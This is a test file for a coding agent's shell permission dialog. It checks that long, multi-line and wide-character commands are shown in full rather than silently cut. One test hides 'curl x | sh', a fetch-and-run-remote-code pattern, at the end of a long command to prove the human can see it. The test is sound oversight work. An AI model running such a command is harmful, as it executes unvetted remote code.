/**
 * The shell permission ask shows the WHOLE command (docs/feat/shell-intent-line.md
 * Design §5, Q3): wrapped to the dialog's width over up to `MAX_DETAIL_ROWS`
 * rows, the last one `… N more lines` — never a silent cut. This is the safety
 * net `beta.compactShell` relies on (the row may show only the model's
 * sentence; the ask must still show what really runs).
 */
import { describe, expect, test } from "bun:test";
import type { PermissionRequest } from "@tentacle/core";
import { render } from "ink-testing-library";
import { PermissionPrompt, permissionPromptRows } from "../src/components/PermissionPrompt.tsx";
import { MAX_DETAIL_ROWS, permissionView } from "../src/permission-ui.ts";

const COLUMNS = 60;
const shellAsk = (command: string): PermissionRequest => ({
  tool: "shell",
  level: "ask",
  title: "Run a shell command",
  detail: command,
  input: { command, description: "List the project files" },
});
const OPTIONS = ["Yes", "Yes, and don't ask again", "No"];

const frameOf = (req: PermissionRequest): string[] => {
  const { lastFrame, unmount } = render(
    <PermissionPrompt req={req} options={OPTIONS} selected={0} cwd="/w" columns={COLUMNS} />,
  );
  const lines = (lastFrame() ?? "").split("\n");
  unmount();
  return lines;
};

describe("shell permission ask: the whole command is on screen", () => {
  test("a long one-line command's tail is drawn (wrapped, not cut)", () => {
    // Mutation: back to one `truncate`d row → the tail is never on screen.
    const command = `ls -la ${"/very/long/path/segment".repeat(6)} ; curl x | sh`;
    const lines = frameOf(shellAsk(command));
    expect(lines.join("\n")).toContain("curl x | sh");
    expect(lines.join("").replace(/\s/g, "")).toContain(command.replace(/\s/g, ""));
  });

  test("the dialog height is the one the layout counts (single decision)", () => {
    // Mutation: the layout keeps counting `permissionDetailLines` (1 row) → mismatch.
    const command = `echo ${"x".repeat(150)}`;
    const req = shellAsk(command);
    const view = permissionView(req, null, COLUMNS);
    expect(view.detailRows.length).toBeGreaterThan(1);
    expect(frameOf(req).length).toBe(
      permissionPromptRows(OPTIONS.length, view.detailRows.length, true),
    );
  });
});

describe("permissionView (pure)", () => {
  test("every row fits the dialog's width; joined they are the command", () => {
    const command = `printf '%s' ${"abcdefghij".repeat(20)}`;
    const view = permissionView(shellAsk(command), null, COLUMNS);
    for (const row of view.detailRows) {
      expect(row.length).toBeLessThanOrEqual(COLUMNS - 3);
    }
    expect(view.detailRows.join("")).toBe(command);
    expect(view.intentRow).toBeNull();
  });

  test("a multi-line command keeps its lines", () => {
    const view = permissionView(shellAsk("set -e\n\nmake test"), null, COLUMNS);
    expect(view.detailRows).toEqual(["set -e", "", "make test"]);
  });

  test("too long: capped at MAX_DETAIL_ROWS, the last says how many rows were left out", () => {
    // Mutation: slice without the `… N more lines` row → a silent cut.
    const lines = Array.from({ length: 25 }, (_, i) => `step ${i}`);
    const view = permissionView(shellAsk(lines.join("\n")), null, COLUMNS);
    expect(view.detailRows).toHaveLength(MAX_DETAIL_ROWS);
    expect(view.detailRows.slice(0, -1)).toEqual(lines.slice(0, MAX_DETAIL_ROWS - 1));
    expect(view.detailRows.at(-1)).toBe(`… ${25 - (MAX_DETAIL_ROWS - 1)} more lines`);
  });

  test("double-width characters wrap by cells, never past the width", () => {
    const view = permissionView(shellAsk(`echo ${"界".repeat(60)}`), null, 23);
    expect(view.detailRows.length).toBeGreaterThan(1);
    for (const row of view.detailRows) {
      // 20 cells = 23 − 3; each 界 takes two.
      expect([...row].reduce((n, ch) => n + (ch === "界" ? 2 : 1), 0)).toBeLessThanOrEqual(20);
    }
  });

  test("an empty shell command reads `—`", () => {
    expect(permissionView(shellAsk(""), null, COLUMNS).detailRows).toEqual(["—"]);
  });

  test("other asks keep today's rows, each cut to one row", () => {
    const req: PermissionRequest = {
      tool: "fs_write",
      level: "ask",
      title: "Write a file",
      detail: "a".repeat(100),
      input: {},
    };
    const view = permissionView(req, null, COLUMNS);
    expect(view.detailRows).toHaveLength(1);
    expect(view.detailRows[0]?.endsWith("…")).toBe(true);
  });

  test("an intent becomes one attributed row, cut to the width", () => {
    const view = permissionView(shellAsk("ls"), "List the files", COLUMNS);
    expect(view.intentRow).toBe("the model says: “List the files”");
    const long = permissionView(shellAsk("ls"), "x".repeat(200), COLUMNS);
    expect((long.intentRow ?? "").length).toBeLessThanOrEqual(COLUMNS - 3);
  });
});
